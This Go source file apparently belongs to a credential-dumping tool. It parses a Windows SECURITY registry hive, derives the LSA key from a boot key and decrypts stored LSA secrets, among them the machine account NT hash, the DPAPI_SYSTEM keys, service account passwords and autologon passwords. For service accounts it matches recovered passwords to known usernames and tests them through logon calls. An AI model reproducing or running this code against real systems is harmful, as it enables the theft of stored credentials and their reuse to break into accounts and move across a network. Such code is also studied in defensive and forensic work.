package creds

import (
	"encoding/binary"
	"strings"
)

func ParseSECURITY(data []byte, bootKey []byte, domainName string, isDomainJoined bool) []*LSASecret {
	var secrets []*LSASecret

	hive, err := ParseHive(data)
	if err != nil {
		return nil
	}

	_, err = hive.ReadNKRecord(hive.RootCellIndex)
	if err != nil {
		return nil
	}

	lsaKey := extractLSAKeyFromSecurity(hive, bootKey)
	if lsaKey == nil {
		lsaKey = bootKey
	}

	secretsKey, err := hive.FindKey("Policy\\Secrets")
	if err != nil {
		return nil
	}

	subkeys := hive.GetSubkeys(secretsKey)

	for _, secretKey := range subkeys {
		secretName := secretKey.Name
		currValKey, err := hive.FindKey("Policy\\Secrets\\" + secretName + "\\CurrVal")
		if err != nil {
			continue
		}

		values := hive.GetValues(currValKey)
		var encryptedSecret []byte

		for _, vk := range values {
			if len(vk.Data) > 0 && encryptedSecret == nil {
				encryptedSecret = vk.Data
				break
			}
		}

		if encryptedSecret == nil || len(encryptedSecret) < 28 {
			continue
		}

		secretData := decryptLSASecret(encryptedSecret, lsaKey)
		if secretData == nil || len(secretData) == 0 {
			continue
		}

		secret := parseSecret(secretName, secretData, domainName, isDomainJoined)
		if secret != nil {
			secrets = append(secrets, secret)
		}
	}

	return secrets
}

func parseSecret(name string, data []byte, domainName string, isDomainJoined bool) *LSASecret {
	secret := &LSASecret{
		Name:	name,
		Data:	data,
	}

	if strings.HasPrefix(name, "$MACHINE.ACC") {
		secret.Type = "machine_account"
		if len(data) >= 20 {
			if len(data) >= 16 {
				possibleOffsets := []int{0, 4, 16, 20}

				for _, offset := range possibleOffsets {
					if offset+16 <= len(data) {
						candidate := data[offset : offset+16]
						if !isAllZero(candidate) && !isAllSame(candidate) {
							secret.NTHash = candidate
							pwdOffset := offset + 16
							if pwdOffset < len(data) {
								secret.Password = utf16ToString(data[pwdOffset:])
							}
							break
						}
					}
				}
			}
		}
	} else if strings.HasPrefix(name, "DPAPI_SYSTEM") {
		secret.Type = "dpapi_system"
		if len(data) >= 44 {
			secret.MachineKey = data[4:24]
			secret.UserKey = data[24:44]
		}
	} else if strings.HasPrefix(name, "_SC_") {
		serviceName := strings.TrimPrefix(name, "_SC_")
		secret.Type = "service_account"
		if len(data) > 0 {
			password := utf16ToString(data)
			if password != "" {
				secret.Password = password

				if ExtractedCredentials != nil {
					for _, credential := range ExtractedCredentials {
						username := strings.ToLower(credential.Username)
						service := strings.ToLower(serviceName)
						if username == service ||
							strings.Contains(service, username) ||
							strings.Contains(username, service) {
							secret.MatchedUser = credential.Username
							credential.Password = password

							if isDomainJoined {
								token := logonUserDomainJoined(credential.Username, password, domainName)
								if token != 0 {
									CloseHandle(token)
								}
							} else {
								token := logonUserNonDomainJoined(credential.Username, password)
								if token != 0 {
									CloseHandle(token)
								}
							}
							break
						}
					}
				}
			}
		}
	} else if strings.HasPrefix(name, "DefaultPassword") {
		secret.Type = "autologon"
		if len(data) > 0 {
			secret.Password = utf16ToString(data)
		}
	} else if strings.HasPrefix(name, "NL$") {
		secret.Type = "cached_domain"
	} else {
		secret.Type = "generic"
		if len(data) <= 64 {
			text := utf16ToString(data)
			if text != "" && isPrintable(text) {
				secret.Password = text
			}
		}
	}

	return secret
}

func decryptLSASecret(encryptedSecret []byte, lsaKey []byte) []byte {
	if len(encryptedSecret) < 28 {
		return nil
	}

	encryptedData := encryptedSecret[28:]

	if len(encryptedData) < 32 {
		return nil
	}

	salt := encryptedData[:32]
	cipherText := encryptedData[32:]

	derivedKey := deriveSHA256Key(lsaKey, salt)

	key32 := derivedKey[:32]
	zeroIV := make([]byte, 16)
	decrypted := decryptAES(key32, zeroIV, cipherText)

	if decrypted != nil && len(decrypted) >= 16 {
		secretLength := binary.LittleEndian.Uint32(decrypted[0:4])

		if secretLength > 0 && secretLength < 10000 && int(secretLength) <= len(decrypted)-16 {

		} else {
			key16 := derivedKey[:16]
			decrypted = decryptAES(key16, zeroIV, cipherText)
		}
	}

	if decrypted == nil {
		return nil
	}

	if len(decrypted) < 16 {
		return nil
	}

	secretLength := binary.LittleEndian.Uint32(decrypted[0:4])
	if secretLength == 0 || int(secretLength) > len(decrypted)-16 {
		return nil
	}

	secret := decrypted[16 : 16+secretLength]
	return secret
}

func isPrintable(s string) bool {
	for _, r := range s {
		if r < 32 || r > 126 {
			if r != '\n' && r != '\r' && r != '\t' {
				return false
			}
		}
	}
	return true
}

func extractLSAKeyFromSecurity(hive *RegistryHive, bootKey []byte) []byte {
	polKeyNK, err := hive.FindKey("Policy\\PolEKList")
	if err != nil {
		polKeyNK, err = hive.FindKey("Policy\\PolSecretEncryptionKey")
		if err != nil {
			return nil
		}
	}

	var encryptedKey []byte

	if polKeyNK.SubkeyCount > 0 {
		subkeys := hive.GetSubkeys(polKeyNK)
		for _, sk := range subkeys {
			if sk.ValueCount > 0 {
				values := hive.GetValues(sk)
				for _, vk := range values {
					if len(vk.Data) >= 28 {
						encryptedKey = vk.Data
						break
					}
				}
				if encryptedKey != nil {
					break
				}
			}
		}
	}

	if encryptedKey == nil && polKeyNK.ValueCount > 0 {
		values := hive.GetValues(polKeyNK)
		for _, vk := range values {
			if len(vk.Data) >= 28 {
				encryptedKey = vk.Data
				break
			}
		}
	}

	if encryptedKey == nil || len(encryptedKey) < 28 {
		return nil
	}

	lsaKey := decryptLSAKeyData(encryptedKey, bootKey)

	return lsaKey
}

func isAllZero(data []byte) bool {
	for _, b := range data {
		if b != 0 {
			return false
		}
	}
	return true
}

func isAllSame(data []byte) bool {
	if len(data) == 0 {
		return true
	}
	first := data[0]
	for _, b := range data[1:] {
		if b != first {
			return false
		}
	}
	return true
}

